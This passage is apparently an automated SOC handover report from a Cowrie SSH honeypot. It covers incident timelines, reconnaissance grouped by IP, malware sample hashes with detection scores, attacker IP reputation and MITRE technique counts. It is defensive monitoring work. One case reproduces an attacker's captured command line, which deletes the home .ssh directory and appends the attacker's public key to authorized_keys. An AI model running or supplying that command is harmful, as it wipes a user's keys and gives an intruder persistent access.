| `2026-06-12 10:09:50` | `cowrie.session.params` |
| `2026-06-12 10:09:50` | `cowrie.command.input` |
| `2026-06-12 10:09:50` | `cowrie.command.failed` |
| `2026-06-12 10:09:51` | `cowrie.log.closed` |
| `2026-06-12 10:09:52` | `cowrie.session.params` |
| `2026-06-12 10:09:52` | `cowrie.command.input` |
| `2026-06-12 10:09:52` | `cowrie.session.file_download` |
| `2026-06-12 10:09:52` | `cowrie.log.closed` |
| `2026-06-12 10:09:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.220.87[.]78` to AbuseIPDB if not already reported
- [ ] Block `102.220.87[.]78` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-24415e1c17e4

| Field | Detail |
|---|---|
| **Source IP** | `102.220.87[.]78` |
| **First Seen** | 2026-06-12 10:09 |
| **Last Seen** | 2026-06-12 10:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 10:09:55` | `cowrie.session.connect` |
| `2026-06-12 10:09:55` | `cowrie.client.version` |
| `2026-06-12 10:09:55` | `cowrie.client.kex` |
| `2026-06-12 10:09:57` | `cowrie.login.success` |
| `2026-06-12 10:09:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.220.87[.]78` to AbuseIPDB if not already reported
- [ ] Block `102.220.87[.]78` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ddd9da003cae

| Field | Detail |
|---|---|
| **Source IP** | `102.220.87[.]78` |
| **First Seen** | 2026-06-12 10:12 |
| **Last Seen** | 2026-06-12 10:12 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 10:12:09` | `cowrie.session.connect` |
| `2026-06-12 10:12:09` | `cowrie.client.version` |
| `2026-06-12 10:12:09` | `cowrie.client.kex` |
| `2026-06-12 10:12:10` | `cowrie.login.success` |
| `2026-06-12 10:12:11` | `cowrie.session.params` |
| `2026-06-12 10:12:11` | `cowrie.command.input` |
| `2026-06-12 10:12:11` | `cowrie.command.failed` |
| `2026-06-12 10:12:11` | `cowrie.log.closed` |
| `2026-06-12 10:12:12` | `cowrie.session.params` |
| `2026-06-12 10:12:12` | `cowrie.command.input` |
| `2026-06-12 10:12:12` | `cowrie.session.file_download` |
| `2026-06-12 10:12:12` | `cowrie.log.closed` |
| `2026-06-12 10:12:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.220.87[.]78` to AbuseIPDB if not already reported
- [ ] Block `102.220.87[.]78` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-89f3ca769db1

| Field | Detail |
|---|---|
| **Source IP** | `102.220.87[.]78` |
| **First Seen** | 2026-06-12 10:12 |
| **Last Seen** | 2026-06-12 10:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 10:12:15` | `cowrie.session.connect` |
| `2026-06-12 10:12:15` | `cowrie.client.version` |
| `2026-06-12 10:12:15` | `cowrie.client.kex` |
| `2026-06-12 10:12:17` | `cowrie.login.success` |
| `2026-06-12 10:12:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.220.87[.]78` to AbuseIPDB if not already reported
- [ ] Block `102.220.87[.]78` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `172.237.27[.]147` | **147** | 2026-06-12 07:11 | 2026-06-12 07:15 | 8m | 39 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `208.109.189[.]59` | **46** | 2026-06-12 05:01 | 2026-06-12 09:48 | 23m | 0 | `T1592` | 🟠 MEDIUM |
| `106.12.108[.]64` | **31** | 2026-06-12 07:25 | 2026-06-12 08:25 | 35m | 2 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `102.220.87[.]78` | **26** | 2026-06-12 09:18 | 2026-06-12 10:16 | 0m | 26 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `223.123.125[.]178` | **25** | 2026-06-12 07:19 | 2026-06-12 07:25 | 5m | 0 | `T1592` | 🟠 MEDIUM |
| `223.123.38[.]123` | **25** | 2026-06-12 05:51 | 2026-06-12 05:56 | 5m | 0 | `T1592` | 🟠 MEDIUM |
| `45.38.228[.]51` | **19** | 2026-06-12 04:22 | 2026-06-12 06:09 | 2m | 19 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `120.231.191[.]30` | **18** | 2026-06-12 04:20 | 2026-06-12 04:36 | 32m | 2 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `188.244.115[.]211` | **16** | 2026-06-12 05:52 | 2026-06-12 06:26 | 0m | 16 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `8.217.133[.]144` | **16** | 2026-06-12 09:35 | 2026-06-12 09:42 | 11m | 11 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `103.213.238[.]91` | **10** | 2026-06-12 04:19 | 2026-06-12 04:37 | 0m | 10 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `128.199.25[.]179` | **2** | 2026-06-12 07:14 | 2026-06-12 07:16 | 1m | 0 | `T1592` | 🟢 LOW |
| `139.19.117[.]130` | **2** | 2026-06-12 08:18 | 2026-06-12 10:14 | 0m | 4 | `T1110.001 · T1592` | 🟢 LOW |
| `20.64.104[.]11` | **2** | 2026-06-12 08:03 | 2026-06-12 08:04 | 0m | 0 | `T1592` | 🟢 LOW |
| `211.46.188[.]16` | **2** | 2026-06-12 05:05 | 2026-06-12 05:11 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `3.134.114[.]142` | **2** | 2026-06-12 10:03 | 2026-06-12 10:04 | 0m | 0 | `T1592` | 🟢 LOW |
| `3.145.0[.]81` | **2** | 2026-06-12 09:48 | 2026-06-12 09:51 | 0m | 0 | `T1592` | 🟢 LOW |
| `101.126.14[.]37` | 1 | 2026-06-12 04:18 | 2026-06-12 04:18 | 120s | 0 | `T1592` | 🟢 LOW |
| `103.180.213[.]153` | 1 | 2026-06-12 10:14 | 2026-06-12 10:14 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `103.76.120[.]198` | 1 | 2026-06-12 07:39 | 2026-06-12 07:39 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `107.150.105[.]116` | 1 | 2026-06-12 07:31 | 2026-06-12 07:31 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `109.247.190[.]45` | 1 | 2026-06-12 05:45 | 2026-06-12 05:45 | 13s | 0 | `T1592` | 🟢 LOW |
| `112.121.204[.]181` | 1 | 2026-06-12 10:08 | 2026-06-12 10:08 | 16s | 0 | `T1592` | 🟢 LOW |
| `113.200.216[.]246` | 1 | 2026-06-12 07:43 | 2026-06-12 07:43 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `114.35.0[.]177` | 1 | 2026-06-12 05:13 | 2026-06-12 05:14 | 30s | 0 | `T1592` | 🟢 LOW |
| `118.122.147[.]49` | 1 | 2026-06-12 09:15 | 2026-06-12 09:17 | 120s | 0 | `T1592` | 🟢 LOW |
| `125.20.228[.]146` | 1 | 2026-06-12 04:27 | 2026-06-12 04:29 | 120s | 0 | `T1592` | 🟢 LOW |
| `128.199.25[.]179` | 1 | 2026-06-12 09:49 | 2026-06-12 09:50 | 36s | 0 | `T1592` | 🟢 LOW |
| `14.103.114[.]218` | 1 | 2026-06-12 09:15 | 2026-06-12 09:17 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.118[.]177` | 1 | 2026-06-12 05:09 | 2026-06-12 05:11 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.118[.]208` | 1 | 2026-06-12 05:03 | 2026-06-12 05:05 | 120s | 0 | `T1592` | 🟢 LOW |
| `160.119.76[.]60` | 1 | 2026-06-12 07:09 | 2026-06-12 07:09 | 0s | 0 | `T1592` | 🟢 LOW |
| `178.176.224[.]83` | 1 | 2026-06-12 07:41 | 2026-06-12 07:41 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `180.177.83[.]26` | 1 | 2026-06-12 09:32 | 2026-06-12 09:33 | 18s | 0 | `T1592` | 🟢 LOW |
| `183.109.153[.]176` | 1 | 2026-06-12 07:02 | 2026-06-12 07:02 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `223.76.158[.]107` | 1 | 2026-06-12 07:36 | 2026-06-12 07:38 | 120s | 0 | `T1592` | 🟢 LOW |
| `27.128.162[.]146` | 1 | 2026-06-12 07:17 | 2026-06-12 07:17 | 3s | 0 | `T1592` | 🟢 LOW |
| `36.39.140[.]2` | 1 | 2026-06-12 06:41 | 2026-06-12 06:42 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `47.238.141[.]1` | 1 | 2026-06-12 08:14 | 2026-06-12 08:14 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `47.251.93[.]227` | 1 | 2026-06-12 06:18 | 2026-06-12 06:19 | 10s | 0 | `T1592` | 🟢 LOW |
| `49.64.85[.]138` | 1 | 2026-06-12 07:59 | 2026-06-12 08:01 | 120s | 0 | `T1592` | 🟢 LOW |
| `58.52.109[.]23` | 1 | 2026-06-12 09:19 | 2026-06-12 09:20 | 13s | 0 | `T1592` | 🟢 LOW |
| `70.123.144[.]239` | 1 | 2026-06-12 09:18 | 2026-06-12 09:18 | 12s | 0 | `T1592` | 🟢 LOW |
| `87.236.176[.]182` | 1 | 2026-06-12 08:58 | 2026-06-12 08:58 | 1s | 0 | `T1592` | 🟢 LOW |
| `91.241.150[.]246` | 1 | 2026-06-12 08:58 | 2026-06-12 08:58 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (35 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0d3d2e513043f33923c8538f0d40b246730eb64d685628c28b89b04b6efcabf3` | ELF Binary (Linux executable) (x86-64 64-bit) | `0d3d2e513043f339...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `235596e7fb00cc04e95c500b5d02891e4b5d5ee54d063553a62c93b6bbd3eb9a` | ELF Binary (Linux executable) (ARM 32-bit) | `235596e7fb00cc04...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `321bfd80417496f99f32183c73d0a46b42900a8ae9d87b4079740b9297bc3cb4` | ELF Binary (Linux executable) (ARM 32-bit) | `321bfd80417496f9...` | 41/100 | 🟡 MEDIUM | **28/75** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `80c3fe2ae1062abf56456f52518bd670f9ec3917b7f85e152b347ac6b6faf880` | Unknown binary | `80c3fe2ae1062abf...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `99ac78541bb555b05a2c82d6c191d62e639b9fefd26ddee1f813b79cc6baf4f0` | ELF Binary (Linux executable) (MIPS 32-bit) | `99ac78541bb555b0...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a2f3d6d2bd82a65939f4e939bce242e8e246014fb3a9a9d5c3769ed7dcfffe24` | Unknown binary | `a2f3d6d2bd82a659...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **32/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `fc6f8ae5f64e4f17481f7e3be29a1c56949f216a998414188003eae1db20c9e5` | GZip Archive | `fc6f8ae5f64e4f17...` | 14/100 | 🟢 LOW | **35/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `128.199.25[.]179` | IN | DigitalOcean, LLC | **100** ⚠️ | 2 |
| `49.124.151[.]52` | MY | DiGi Telecommunications Sdn Bhd | **100** ⚠️ | 11 |
| `223.123.125[.]178` | PK | CMPak Limited | **100** ⚠️ | 5 |
| `183.109.153[.]176` | KR | Korea Telecom | **100** ⚠️ | 34 |
| `172.237.27[.]147` | JP | Linode | **100** ⚠️ | 32 |
| `91.241.150[.]246` | RU | NEO-TELEKOM Ltd | **100** ⚠️ | 50 |
| `27.128.162[.]146` | CN | CHINANET hebei province network | **100** ⚠️ | 50 |
| `47.238.141[.]1` | HK | ALIBABA CLOUD - HK | **100** ⚠️ | 1 |
| `125.20.228[.]146` | IN | Bharti Televentures Limited A/c ABTS MP | **100** ⚠️ | 50 |
| `49.64.85[.]138` | CN | CHINANET jiangsu province network | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 197 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 128 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 49 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 24 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 24 |

---

## 🔕 False Positive Summary (22 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 3 |
| AbuseIPDB score 15 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 18 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 490 cases |
| Tool 34  | Credential Extractor        | ✅ 188 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 11 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 70 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 22 filtered (4.5%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 46 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 35 files |
| Tool 33  | YARA Classifier             | ✅ 10 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 49 priority case(s) shown individually · 45 recon entry/entries in table (17 group(s) consolidating 391 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-06-12T10:20:18Z_
